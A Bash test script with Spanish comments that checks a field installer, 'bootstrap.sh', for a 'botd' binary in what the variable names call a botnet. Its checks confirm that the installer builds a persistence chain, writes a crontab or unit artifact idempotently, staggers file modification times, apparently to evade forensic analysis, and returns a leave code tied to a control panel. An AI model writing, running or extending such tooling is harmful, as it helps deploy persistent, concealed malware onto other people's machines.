#!/usr/bin/env bash
# bootstrap_test.sh — prueba de campo de bootstrap.sh (se ejecuta de
# verdad, no solo comprueba sintaxis). No necesita red ni Go: usa el binario ya
# construido en dist/ y un tmpdir como directorio de estado.
#
# Uso:   bash scripts/field/bootstrap_test.sh
# Exit:  0 si todas las comprobaciones pasan; 1 si alguna falla;
#        3 si falta una herramienta o el binario de dist/ (nada probable).
#
# Comprobaciones:
#   1) --help sale 0 y menciona --dry.
#   2) --dry con una arch existente sale 0 y su JSON trae persist_chain no vacia.
#   3) --arch inexistente sale 2 o 3 con mensaje claro.
#   4) dos pasadas reales con --target local --data <tmpdir> dejan el
#      fichero instalado y la segunda dice "ya instalado", sin duplicar
#      la linea de guard.
set -uo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
cd "$ROOT" || exit 2
S="scripts/field/bootstrap.sh"
ARCH="${BOTNET_TEST_ARCH:-amd64}"
BIN="dist/botd-$ARCH"

command -v jq >/dev/null 2>&1 || { echo "bootstrap_test: falta jq (doble: instala jq o usa grep)" >&2; }
[ -f "$BIN" ] || { echo "bootstrap_test: binario ausente $BIN (construye con scripts/build/all.sh)" >&2; exit 3; }

# tmpdir de estado, limpio con trap aunque falle algo.
TMPD="$(mktemp -d)"
trap 'rm -rf "$TMPD"' EXIT

FALLAS=0
ok()   { printf '  ok   %s\n' "$*"; }
ko()   { printf '  FALLA %s\n' "$*"; FALLAS=$(( FALLAS + 1 )); }

printf 'bootstrap_test (%s, binario %s, data %s)\n' "$S" "$BIN" "$TMPD/botd"

# --- 1) --help --------------------------------------------------------
H="$(bash "$S" --help 2>&1)"; RC=$?
if [ "$RC" = 0 ] && printf '%s' "$H" | grep -qi -- '--dry'; then
  ok "--help sale 0 y documenta --dry"
else
  ko "--help deberia salir 0 y mencionar --dry (rc=$RC)"
fi

# --- 2) --dry con arch existente: rc 0 y persist_chain no vacia -------
DRY_JSON="$(bash "$S" --arch "$ARCH" --data "$TMPD/botd" --dry --json 2>/dev/null)"; RC=$?
CHAIN=""
if command -v jq >/dev/null 2>&1; then
  CHAIN="$(printf '%s' "$DRY_JSON" | jq -r '.persist_chain | join(",")' 2>/dev/null)"
else
  CHAIN="$(printf '%s' "$DRY_JSON" | sed -e 's/.*"persist_chain":\[\([^]]*\)\].*/\1/' -e 's/"//g' -e 's/,/,/g')"
fi
if [ "$RC" = 0 ] && [ -n "$CHAIN" ]; then
  ok "--dry sale 0 con persist_chain no vacia: [$CHAIN]"
else
  ko "--dry deberia salir 0 con persist_chain no vacia (rc=$RC, cadena='$CHAIN')"
fi
if [ "$DRY_JSON" != "" ] && printf '%s' "$DRY_JSON" | grep -q '"dry":true'; then
  ok "--dry no instala (dry:true en el JSON)"
else
  ko "--dry deberia reportar dry:true"
fi
if [ ! -e "$TMPD/botd/botd" ]; then
  ok "--dry no creo $TMPD/botd/botd (no toca nada)"
else
  ko "--dry creo ficheros en $TMPD/botd"
fi

# --- 3) --arch inexistente: 2 o 3 con mensaje claro -------------------
ERR="$(bash "$S" --arch ppc64le --data "$TMPD/botd" --dry --json 2>&1 >/dev/null)"; RC=$?
if { [ "$RC" = 2 ] || [ "$RC" = 3 ]; } && printf '%s' "$ERR" | grep -qi -- '--arch'; then
  ok "--arch inexistente sale $RC con mensaje claro: $ERR"
else
  ko "--arch inexistente deberia salir 2 o 3 y nombrar --arch (rc=$RC, msg='$ERR')"
fi

# --- 4) dos pasadas reales sobre el mismo --data ----------------------
P1="$(bash "$S" --arch "$ARCH" --target local --data "$TMPD/botd" --json 2>/dev/null)"; RC1=$?
P2H="$(bash "$S" --arch "$ARCH" --target local --data "$TMPD/botd" 2>&1)"; RC2=$?
INST=""; ALREADY=""
if command -v jq >/dev/null 2>&1; then
  INST="$(printf '%s' "$P1" | jq -r '.installed' 2>/dev/null)"
  ALREADY="$(printf '%s' "$P2H" | grep -c 'ya instalado' 2>/dev/null)"
else
  printf '%s' "$P1" | grep -q '"installed":true' && INST=true
  ALREADY="$(printf '%s' "$P2H" | grep -c 'ya instalado')"
fi

if [ "$RC1" = 0 ] && [ -f "$TMPD/botd/botd" ]; then
  ok "primera pasada instala $TMPD/botd/botd (installed=$INST)"
else
  ko "primera pasada deberia instalar el fichero (rc=$RC1, installed=$INST)"
fi

if [ "$RC2" = 0 ] && [ "${ALREADY:-0}" -ge 1 ]; then
  ok "segunda pasada dice 'ya instalado' (rc=$RC2)"
else
  ko "segunda pasada deberia decir 'ya instalado' (rc=$RC2, coincidencias=${ALREADY:-0})"
fi

# Idempotencia mecánica: el numero de lineas del artefacto de persistencia
# no cambia entre la primera y la segunda pasada (0 unidades/lineas duplicadas).
ART="$(command -v jq >/dev/null 2>&1 && printf '%s' "$P1" | jq -r '.unit_path' 2>/dev/null || printf '%s/botd/crontab' "$TMPD")"
[ -z "$ART" ] || [ "$ART" = "null" ] && ART="$TMPD/botd/crontab"
if [ -f "$ART" ]; then
  N2="$(wc -l < "$ART" | tr -d ' ')"
  bash "$S" --arch "$ARCH" --target local --data "$TMPD/botd" >/dev/null 2>&1
  N3="$(wc -l < "$ART" | tr -d ' ')"
  if [ "$N2" = "$N3" ]; then
    ok "idempotente: $ART sigue con $N3 linea(s) tras una tercera pasada"
  else
    ko "idempotencia rota en $ART: $N2 → $N3 lineas"
  fi
else
  ko "no hay artefacto de persistencia en $ART"
fi

# mtimes escalonados: min < max (el bundle no nace con un solo mtime comun)
if command -v jq >/dev/null 2>&1; then
  MTMIN="$(printf '%s' "$P1" | jq -r '.mtimes.min' 2>/dev/null)"
  MTMAX="$(printf '%s' "$P1" | jq -r '.mtimes.max' 2>/dev/null)"
  if [ -n "$MTMIN" ] && [ "$MTMIN" != null ] && [ -n "$MTMAX" ] && [ "$MTMAX" != null ] && [ "$MTMAX" -gt "$MTMIN" ]; then
    ok "mtimes escalonados: min=$MTMIN max=$MTMAX (paso >= 10s)"
  else
    ko "mtimes sin escalar: min=$MTMIN max=$MTMAX"
  fi
else
  printf '%s' "$P1" | grep -q '"mtimes":{"min":' && ok "mtimes presentes en el JSON" || ko "mtimes ausentes en el JSON"
fi

# leave_code_hint presente (el codigo real lo da el panel, no bootstrap)
if printf '%s' "$P1" | grep -q 'leave_code'; then
  ok "JSON trae leave_code_hint (alta con ticket → leave_code de 8)"
else
  ko "JSON sin leave_code_hint"
fi

printf '%s\n' "---"
if [ "$FALLAS" = 0 ]; then
  printf 'bootstrap_test: TODAS las comprobaciones pasaron\n'
  exit 0
fi
printf 'bootstrap_test: %d comprobacion(es) fallida(s)\n' "$FALLAS"
exit 1
